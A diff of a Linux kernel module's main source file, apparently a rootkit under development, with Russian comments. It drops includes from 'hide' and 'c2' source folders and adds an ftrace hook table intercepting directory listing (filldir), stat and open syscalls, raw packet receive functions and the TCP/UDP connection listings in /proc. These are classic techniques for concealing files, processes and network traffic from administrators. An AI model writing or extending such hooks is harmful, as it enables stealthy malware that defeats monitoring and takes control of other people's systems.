@@ -5,7 +5,6 @@
 #include <linux/slab.h>			// работа с памятью (выделение освободждение и тп)
 #include <linux/uaccess.h>		// взаимодействие с пространством пользователя
 #include <linux/kprobes.h>
-#include <linux/ftrace.h>
 #include <linux/version.h>
 #include <linux/module.h>
 
@@ -16,16 +15,6 @@
 
 
 #include "src/hooks.h"
-#include "src/hide/filter_functions.c"
-
-#include "src/hide/filldir.c"
-// #include "src/hide/getdents.c"
-#include "src/hide/stat.c"
-
-#include "src/hide/openx.c"	
-#include "src/hide/net.c"
-
-#include "src/c2/conn_serv.c"
 
 
 MODULE_LICENSE("GPL");
@@ -33,6 +22,43 @@ MODULE_LICENSE("GPL");
 int debug_lvl = 0;
 module_param(debug_lvl, int, 0600);
 MODULE_PARM_DESC(debug_lvl, "Debug level 0/1");
+
+
+// -------- пока пусть тут ----------------
+
+// asmlinkage long (*real_sys_open)(struct pt_regs *regs) = NULL;
+
+struct ftrace_hook EX_hooks[] = {
+	HOOK("filldir64", ex_filldir64, &real_filldir64),
+	HOOK("filldir", ex_filldir, &real_filldir),
+
+
+	// SYS_HOOK("sys_getdents64", ex_sys_getdents64, &real_sys_getdents64),
+
+	// !sys_stat64 sys_lstat64 ??
+	SYS_HOOK("sys_stat", ex_sys_stat, &real_sys_stat),
+	SYS_HOOK("sys_lstat", ex_sys_lstat, &real_sys_lstat),
+	SYS_HOOK("sys_newstat", ex_sys_newstat, &real_sys_newstat),
+	SYS_HOOK("sys_newlstat", ex_sys_newlstat, &real_sys_newlstat),
+	SYS_HOOK("sys_newfstatat", ex_sys_newfstatat, &real_sys_newfstatat),
+	SYS_HOOK("sys_statx", ex_sys_statx, &real_sys_statx),
+
+	SYS_HOOK("sys_open", ex_sys_open, &real_sys_open),
+	SYS_HOOK("sys_openat", ex_sys_openat, &real_sys_openat),
+	SYS_HOOK("sys_openat2", ex_sys_openat2, &real_sys_openat2),
+
+	// SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),
+
+	HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
+	HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
+	HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),
+
+	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
+	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
+	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
+	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
+};
+// ------------------------
 
 // Функция поиска адреса системной функции
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
